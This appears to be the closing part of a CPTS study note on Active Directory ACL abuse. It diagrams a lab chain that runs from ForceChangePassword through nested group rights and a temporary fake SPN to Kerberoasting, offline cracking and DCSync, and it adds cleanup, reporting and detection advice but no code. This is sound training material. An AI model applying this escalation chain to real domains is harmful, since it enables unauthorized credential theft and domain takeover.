> [!tip] CPTS takeaway  
> When an attack requires modifying an AD object, always ask:
> 
> **"Can the modification be temporary?"**
> 
> Temporary modifications can reduce the time an object remains altered, but they still require authorization and should still be documented.

---

# 🔄 29. ACL Abuse vs. Direct Exploitation

ACL abuse is different from finding a traditional software vulnerability.

Traditional vulnerability:

```text
Service
   ↓
Vulnerability
   ↓
Exploit
   ↓
Shell
```

ACL abuse:

```text
Identity
   ↓
Permission
   ↓
Object
   ↓
Inherited permission
   ↓
Another identity/object
   ↓
More permissions
   ↓
Attack path
```

This is why ACL weaknesses can be missed if enumeration focuses only on:

- Open ports
    
- Vulnerable software
    
- Missing patches
    
- Known CVEs
    

Active Directory permissions themselves form a large attack surface.

---

# 📝 30. Assessment Reporting

Even after successful cleanup, document every modification.

A useful reporting model is:

```text
Object
  ↓
Permission / modification
  ↓
Account responsible
  ↓
Purpose
  ↓
Impact
  ↓
Evidence
  ↓
Cleanup status
```

For this attack, the report should capture at minimum:

```text
wley
 └─ used ForceChangePassword
       ↓
damundsen password changed
       ↓
damundsen added to Help Desk Level 1
       ↓
inherited Information Technology membership
       ↓
GenericAll over adunn
       ↓
temporary SPN created
       ↓
TGS obtained
       ↓
temporary SPN removed
       ↓
damundsen removed from group
       ↓
damundsen password restoration / client action
```

---

# 🛡️ 31. Defensive Recommendations

## 🔍 Regularly Audit Dangerous ACLs

Organizations should regularly inspect Active Directory permissions and identify dangerous relationships.

Important permissions to review include:

- `GenericAll`
    
- `GenericWrite`
    
- `ForceChangePassword`
    
- Group membership modification rights
    
- Replication-related rights
    
- Rights over privileged users/groups
    

Tools such as BloodHound can help visualize these relationships.

---

## 👥 Monitor High-Impact Group Membership

Monitor membership changes to important groups.

The objective is to detect:

```text
Unexpected user
      ↓
Added to sensitive group
      ↓
Potential ACL abuse
```

Especially investigate changes involving:

- Privileged groups
    
- Groups nested into privileged groups
    
- Custom administrative groups
    
- Groups with control over privileged users
    

---

## 📝 Monitor Directory Service Changes

Enable appropriate Advanced Security Audit Policy settings and monitor relevant directory-service events.

In particular:

```text
Event ID 5136
Directory Service Object Modified
```

can provide evidence that an AD object was modified.

Investigators can then inspect the resulting security descriptor and determine whether dangerous permissions were introduced.

---

# 🎯 32. CPTS Mental Model — The Whole Section

The most important thing to remember is the **chain**, not the individual commands:

```text
┌───────────────────────────────────────────┐
│              START: wley                  │
└────────────────────┬──────────────────────┘
                     │
                     │ ForceChangePassword
                     ▼
              ┌─────────────┐
              │  damundsen  │
              └──────┬──────┘
                     │
                     │ GenericWrite
                     ▼
          ┌──────────────────────┐
          │ Help Desk Level 1    │
          └──────────┬───────────┘
                     │
                     │ Nested membership
                     ▼
          ┌──────────────────────┐
          │ Information Technology│
          └──────────┬───────────┘
                     │
                     │ GenericAll
                     ▼
              ┌─────────────┐
              │    adunn    │
              └──────┬──────┘
                     │
                     │ Modify SPN
                     ▼
              Fake SPN created
                     │
                     ▼
               Request TGS
                     │
                     ▼
             Kerberoast hash
                     │
                     ▼
              Offline cracking
                     │
                     ▼
              adunn credentials
                     │
                     ▼
                  DCSync
```

> [!success] The Core Lesson  
> **ACL exploitation is graph traversal.**
> 
> You start with an identity you control, identify what that identity can control, abuse or validate that control, become able to act as another identity or through another group, and then repeat the enumeration.
> 
> ```text
> CONTROL
>    ↓
> ENUMERATE
>    ↓
> FOLLOW ACL
>    ↓
> GAIN NEW CONTROL
>    ↓
> ENUMERATE AGAIN
>    ↓
> FOLLOW NEXT ACL
>    ↓
> REPEAT
> ```
> 
> BloodHound helps visualize this graph, while PowerView and native AD tooling allow you to inspect and manipulate the individual relationships.

---

# 📌 33. Key Takeaways

> [!important] Remember These for CPTS
> 
> 1. **`ForceChangePassword`** can turn control of one user into control of another user's credentials.
>     
> 2. **`GenericWrite` over a group** can be leveraged to modify group membership when the effective permissions allow it.
>     
> 3. **Nested groups matter** — gaining membership in one group can indirectly grant the permissions of another group.
>     
> 4. **`GenericAll` over a user** provides broad object control and can enable multiple attack paths.
>     
> 5. **Targeted Kerberoasting** can use a temporary fake SPN instead of directly changing a privileged user's password.
>     
> 6. **Rubeus** can request the TGS and return a Kerberoastable hash.
>     
> 7. The TGS hash can be **cracked offline** with a password-cracking tool such as Hashcat.
>     
> 8. **Temporary modifications should be removed** when possible and authorized.
>     
> 9. **Cleanup order matters** when later cleanup operations depend on permissions obtained earlier in the attack chain.
>     
> 10. **Every modification must be documented** in a professional assessment.
>     
> 11. **Event ID 5136** can provide evidence of Active Directory object modifications.
>     
> 12. **SDDL** represents security descriptors in a compact format; `ConvertFrom-SddlString` makes them easier to inspect.
>     
> 13. ACL attacks should be viewed as **attack graphs**, not isolated permissions.
>     
> 14. The most important methodology is:
>     
> 
> ```text
> Controlled account
>       ↓
> ACL enumeration
>       ↓
> Interesting permission
>       ↓
> Abuse / validate
>       ↓
> New identity or group control
>       ↓
> Enumerate again
>       ↓
> Follow nesting and ACLs
>       ↓
> High-impact object
> ```
> 
> [!tip] Exam Shortcut  
> When you see an interesting ACL, immediately ask:
> 
> **"Who has the right → over what object → what does that right allow me to change → does that give me another identity/group → what does that new identity control?"**
> 
> That question is the core of ACL attack-path enumeration.